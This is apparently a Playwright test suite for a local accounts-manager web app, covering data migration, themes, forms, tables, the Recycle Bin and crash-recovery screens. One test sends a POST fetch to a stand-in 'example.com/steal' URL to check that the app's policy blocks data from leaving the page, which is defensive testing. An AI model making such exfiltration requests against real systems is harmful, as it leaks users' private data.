// The app frame, components and safety screens.
import { moveToBin } from "../../js/core/bin.js";
import { test, expect, fixture, sampleV2, savedData, seed, watchPage } from "./helpers.mjs";

test("an existing v1 user lands on their data with every figure intact, and the old data untouched", async ({ page }) => {
  const problems = watchPage(page);
  const v1 = fixture("v1-sample");
  await seed(page, { v1 });
  await page.goto("/index.html");
  await page.getByRole("button", { name: "Skip for now" }).click();
  const kpis = page.locator(".kpis");
  await expect(kpis).toContainText("₹8,34,481");
  await expect(kpis).toContainText("₹1,70,150");
  await expect(kpis).toContainText("₹49,771");
  const oldData = await page.evaluate(() => localStorage.getItem("accounts-manager:v1"));
  expect(oldData).toBe(JSON.stringify(v1));
  expect((await savedData(page)).schemaVersion).toBe(2);
  expect(problems).toEqual([]);
});

test("the rupee sign comes from the bundled font, and figures line up", async ({ page }) => {
  await seed(page, { data: sampleV2() });
  await page.goto("/index.html#/styleguide");
  const result = await page.evaluate(async () => {
    await document.fonts.ready;
    const faces = await document.fonts.load('16px "Inter"', "₹");
    const span = document.createElement("span");
    span.className = "num";
    document.body.appendChild(span);
    const width = (t) => { span.textContent = t; return span.getBoundingClientRect().width; };
    const out = { faces: faces.length, family: getComputedStyle(span).fontFamily, ones: width("111111"), eights: width("888888") };
    span.remove();
    return out;
  });
  expect(result.faces).toBeGreaterThan(0);
  expect(result.family).toContain("Inter");
  expect(result.ones).toBeCloseTo(result.eights, 1);
});

test("the policy blocks the app from sending data anywhere else", async ({ page }) => {
  await seed(page, { data: sampleV2() });
  await page.goto("/index.html");
  const outcome = await page.evaluate(async () => {
    try { await fetch("https://example.com/steal", { method: "POST", body: "data", mode: "no-cors" }); return "sent"; } catch { return "blocked"; }
  });
  expect(outcome).toBe("blocked");
});

test("the theme follows the system first, then remembers the choice", async ({ page, isMobile }) => {
  await page.emulateMedia({ colorScheme: "dark" });
  await seed(page, { data: sampleV2() });
  await page.goto("/index.html");
  const theme = () => page.evaluate(() => document.documentElement.dataset.theme);
  expect(await theme()).toBe("dark");
  await page.getByRole("button", { name: "Colour theme" }).click();
  await page.getByRole("menuitemradio", { name: "Light" }).click();
  expect(await theme()).toBe("light");
  await page.reload();
  expect(await theme()).toBe("light");
  await page.getByRole("button", { name: "Colour theme" }).click();
  await page.getByRole("menuitemradio", { name: "Match system" }).click();
  expect(await theme()).toBe("dark");
});

test("every page has its own address, and Back works", async ({ page }) => {
  await seed(page, { data: sampleV2() });
  await page.goto("/index.html#/recycle-bin");
  await expect(page.locator("h1")).toHaveText("Recycle Bin");
  await page.goto("/index.html#/styleguide");
  await expect(page.locator("h1")).toHaveText("Style guide");
  await page.goBack();
  await expect(page.locator("h1")).toHaveText("Recycle Bin");
  await expect(page).toHaveTitle(/Recycle Bin/);
});

test("the month picker steps through months and is saved", async ({ page }) => {
  await seed(page, { data: sampleV2() });
  await page.goto("/index.html");
  const select = page.locator("[data-month-select]");
  await expect(select).toHaveValue("2026-10");
  await page.getByRole("button", { name: "Previous month" }).click();
  await expect(page.locator("[data-month-select]")).toHaveValue("2026-09");
  await page.getByRole("button", { name: "Next month" }).click();
  await page.getByRole("button", { name: "Next month" }).click();
  await expect(page.locator("[data-month-select]")).toHaveValue("2026-11");
  expect((await savedData(page)).settings.month).toBe("2026-11");
});

test("forms show errors beside fields, focus the first, and warn before losing typing", async ({ page }) => {
  await seed(page, { data: sampleV2() });
  await page.goto("/index.html#/styleguide");
  await page.locator("[data-demo-form]").click();
  const dialog = page.locator("dialog");
  await expect(dialog).toBeVisible();
  await dialog.getByRole("button", { name: "Save" }).click();
  await expect(dialog.getByText("Name is required")).toBeVisible();
  await expect(dialog.getByText("Amount is required")).toBeVisible();
  await expect(dialog.getByLabel("Name")).toBeFocused();
  await expect(dialog.getByLabel("Name")).toHaveAttribute("aria-invalid", "true");
  await dialog.getByLabel("Name").fill("Typed");
  await page.keyboard.press("Escape");
  await expect(dialog.getByText("You have unsaved changes.")).toBeVisible();
  await dialog.getByRole("button", { name: "Keep editing" }).click();
  await expect(dialog.getByLabel("Name")).toHaveValue("Typed");
  await dialog.getByLabel("Amount").fill("1,200.50");
  await dialog.getByLabel(/^Date/).fill("2026-11-01");
  await dialog.getByRole("button", { name: "Save" }).click();
  await expect(dialog).toBeHidden();
  await expect(page.getByText("Saved")).toBeVisible();
});

test("the payment control only asks for what each mode needs", async ({ page }) => {
  await seed(page, { data: sampleV2() });
  await page.goto("/index.html#/styleguide");
  await page.locator("[data-demo-form]").click();
  const dialog = page.locator("dialog");
  const pick = (name) => dialog.locator(".seg label", { hasText: name }).click();
  const accounts = dialog.getByLabel("Account");
  await pick("Cash");
  await expect(accounts).toBeVisible();
  await expect(accounts.locator("option")).toHaveText(["Cash in hand"]);
  await pick("Bank");
  await expect(accounts.locator("option")).toHaveText(["Current account", "Savings"]);
  await pick("UPI");
  await expect(accounts).toHaveValue("b1");
  await pick("Credit");
  await expect(accounts).toBeHidden();
  await expect(dialog.getByLabel("Due date")).toBeVisible();
});

test("tables sort, search, filter and clear", async ({ page, isMobile }) => {
  await seed(page, { data: sampleV2() });
  await page.goto("/index.html#/styleguide");
  const table = page.locator("[data-demo-table]");
  const names = () => table.locator("tbody .cell-title").allTextContents();
  await expect.poll(names).toEqual(["Coastal Chemicals Pvt Ltd", "St. Mary's School", "Harbour View Hotel"]);
  if (!isMobile) {
    await table.getByRole("button", { name: "Amount" }).click();
    await expect(table.locator('th[aria-sort="ascending"]')).toHaveText(/Amount/);
    await expect.poll(names).toEqual(["St. Mary's School", "Coastal Chemicals Pvt Ltd", "Harbour View Hotel"]);
  }
  await table.getByRole("searchbox").fill("mary");
  await expect.poll(names).toEqual(["St. Mary's School"]);
  await expect(table.locator("tfoot")).toContainText("₹28,800");
  await table.getByRole("searchbox").fill("nothing like this");
  await expect(table.getByText("No matches")).toBeVisible();
  await table.getByRole("button", { name: "Clear filters" }).click();
  await expect.poll(async () => (await names()).length).toBe(3);
  await table.getByLabel("All statuses").selectOption("Overdue");
  await expect.poll(names).toEqual(["Coastal Chemicals Pvt Ltd"]);
});

test("the keyboard shortcuts work and stay out of the way while typing", async ({ page, isMobile }) => {
  test.skip(isMobile, "keyboard shortcuts are for desktop");
  await seed(page, { data: sampleV2() });
  await page.goto("/index.html#/styleguide");
  await page.keyboard.press("/");
  const search = page.locator("[data-table-search]").first();
  await expect(search).toBeFocused();
  await page.keyboard.type("?");
  await expect(search).toHaveValue("?");
  await expect(page.locator("dialog")).toBeHidden();
  await search.fill("");
  await page.locator("h1").click();
  await page.keyboard.press("?");
  await expect(page.locator("dialog")).toContainText("Keyboard shortcuts");
  await page.keyboard.press("Escape");
  await expect(page.locator("dialog")).toBeHidden();
  await page.keyboard.press("g");
  await page.keyboard.press("d");
  await expect(page.locator("h1")).toHaveText("Dashboard");
});

test.describe("Recycle Bin", () => {
  const withBin = () => {
    const s = sampleV2();
    const now = new Date("2026-11-01T10:00:00Z");
    const a = moveToBin(s, "invoice", "i2", { now });
    const b = moveToBin(a.state, "advance", "a0", { now });
    return { state: b.state, invoice: a.entry, advance: b.entry };
  };

  test("restoring puts the record and its money back", async ({ page }) => {
    const { state } = withBin();
    const savingsBefore = sampleV2().invoices.find((i) => i.id === "i2");
    await seed(page, { data: state });
    await page.goto("/index.html#/recycle-bin");
    const row = page.locator("tbody tr", { hasText: "Invoice ST-002" });
    await expect(row).toBeVisible();
    await row.getByRole("button", { name: "Restore" }).click();
    await expect(page.getByText("Restored")).toBeVisible();
    await expect(page.locator("tbody tr", { hasText: "Invoice ST-002" })).toHaveCount(0);
    const saved = await savedData(page);
    expect(saved.invoices.find((i) => i.id === "i2")).toEqual(savingsBefore);
    expect(saved.bin).toHaveLength(1);
  });

  test("deleting permanently asks first", async ({ page }) => {
    await seed(page, { data: withBin().state });
    await page.goto("/index.html#/recycle-bin");
    const row = page.locator("tbody tr", { hasText: "Advance" });
    await row.getByRole("button", { name: "Delete permanently" }).click();
    const dialog = page.locator("dialog");
    await expect(dialog).toContainText("can't be undone");
    await dialog.getByRole("button", { name: "Cancel" }).click();
    expect((await savedData(page) ?? withBin().state).bin.length).toBe(2);
    await row.getByRole("button", { name: "Delete permanently" }).click();
    await page.locator("dialog").getByRole("button", { name: "Delete permanently" }).click();
    await expect(page.locator("tbody tr")).toHaveCount(1);
    expect((await savedData(page)).bin).toHaveLength(1);
  });

  test("emptying the bin needs a typed word", async ({ page }) => {
    await seed(page, { data: withBin().state });
    await page.goto("/index.html#/recycle-bin");
    await page.getByRole("button", { name: "Empty bin" }).click();
    const dialog = page.locator("dialog");
    const go = dialog.getByRole("button", { name: "Empty the bin" });
    await expect(go).toBeDisabled();
    await dialog.getByLabel("Type EMPTY to confirm").fill("nope");
    await expect(go).toBeDisabled();
    await dialog.getByLabel("Type EMPTY to confirm").fill("empty");
    await go.click();
    await expect(page.getByText("The Recycle Bin is empty")).toBeVisible();
    expect((await savedData(page)).bin).toHaveLength(0);
  });

  test("an empty bin explains itself", async ({ page }) => {
    await seed(page, { data: sampleV2() });
    await page.goto("/index.html#/recycle-bin");
    await expect(page.getByText("The Recycle Bin is empty")).toBeVisible();
    await expect(page.getByRole("button", { name: "Empty bin" })).toHaveCount(0);
  });
});

test.describe("safety screens", () => {
  test("data that can't be read gets the rescue screen and is left alone", async ({ page }) => {
    await seed(page, { raw: { "accounts-manager:data": "{not json" } });
    await page.goto("/index.html");
    await expect(page.locator("h1")).toHaveText("Your data is safe");
    const download = page.waitForEvent("download");
    await page.getByRole("button", { name: "Download my data" }).click();
    expect((await download).suggestedFilename()).toBe("accounts-manager-rescue.json");
    expect(await page.evaluate(() => localStorage.getItem("accounts-manager:data"))).toBe("{not json");
  });

  test("data from a newer version is refused with a clear reason", async ({ page }) => {
    await seed(page, { raw: { "accounts-manager:data": JSON.stringify({ schemaVersion: 99 }) } });
    await page.goto("/index.html");
    await expect(page.getByText("newer version")).toBeVisible();
  });

  test("an unexpected error shows the crash screen with a backup option", async ({ page }) => {
    await seed(page, { data: sampleV2() });
    await page.goto("/index.html");
    await expect(page.locator(".kpis")).toBeVisible();
    await page.evaluate(() => window.dispatchEvent(new ErrorEvent("error", { error: new Error("boom") })));
    await expect(page.getByRole("heading", { name: "Something went wrong" })).toBeVisible();
    await expect(page.getByRole("button", { name: "Reload the app" })).toBeFocused();
    const download = page.waitForEvent("download");
    await page.getByRole("button", { name: "Download a backup" }).click();
    expect((await download).suggestedFilename()).toBe("accounts-manager-backup.json");
  });
});

test("a change in another tab appears here", async ({ page, context }) => {
  await seed(page, { data: sampleV2() });
  await page.goto("/index.html");
  await expect(page.locator(".kpis")).toBeVisible();
  const other = await context.newPage();
  await other.goto("/index.html");
  await expect(other.locator(".kpis")).toBeVisible();
  await other.getByRole("button", { name: "Next month" }).click();
  await expect(other.locator("[data-month-select]")).toHaveValue("2026-11");
  await expect(page.locator("[data-month-select]")).toHaveValue("2026-11");
  await expect(page.getByText("Updated from another tab")).toBeVisible();
});

test("phones get a bottom bar with every page under More", async ({ page, isMobile }) => {
  test.skip(!isMobile, "phone layout");
  await seed(page, { data: sampleV2() });
  await page.goto("/index.html");
  const bar = page.getByRole("navigation", { name: "Quick links" });
  await expect(bar).toBeVisible();
  await expect(page.locator(".side")).toBeHidden();
  await bar.getByRole("button", { name: "More" }).click();
  const dialog = page.locator("dialog");
  await dialog.getByRole("link", { name: "Recycle Bin" }).click();
  await expect(dialog).toBeHidden();
  await expect(page.locator("h1")).toHaveText("Recycle Bin");
  const small = await page.evaluate(() => [...document.querySelectorAll(".bottom-bar a, .bottom-bar button, .topbar button")]
    .filter((b) => b.offsetParent && b.getBoundingClientRect().height < 32).length);
  expect(small).toBe(0);
});
